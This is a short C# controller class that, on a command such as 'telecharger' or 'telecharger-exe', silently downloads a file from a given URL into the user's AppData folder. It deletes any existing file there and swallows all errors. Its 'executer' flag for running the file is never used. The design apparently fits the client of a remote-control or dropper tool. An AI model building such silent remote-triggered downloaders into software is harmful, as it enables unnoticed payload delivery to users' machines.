using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC.Controller
{
    class TelechargeurController : ControllerBase
    {
        string racineF = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public void Telechargeur(string[] objet)
        {
            if (objet[1] == "telecharger")
            {
                telecharger(objet[2], objet[3]);
            }
            else if (objet[1] == "telecharger-exe")
            {
                telecharger(objet[2], objet[3], true);
            }
        }

        private void telecharger(string url, string chemin_dest, bool executer = false)
        {
            chemin_dest = racineF + chemin_dest;

            if (File.Exists(chemin_dest))
                File.Delete(chemin_dest);
            try
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile(url, chemin_dest);
                }
            }
            catch { }
        }

    }
}
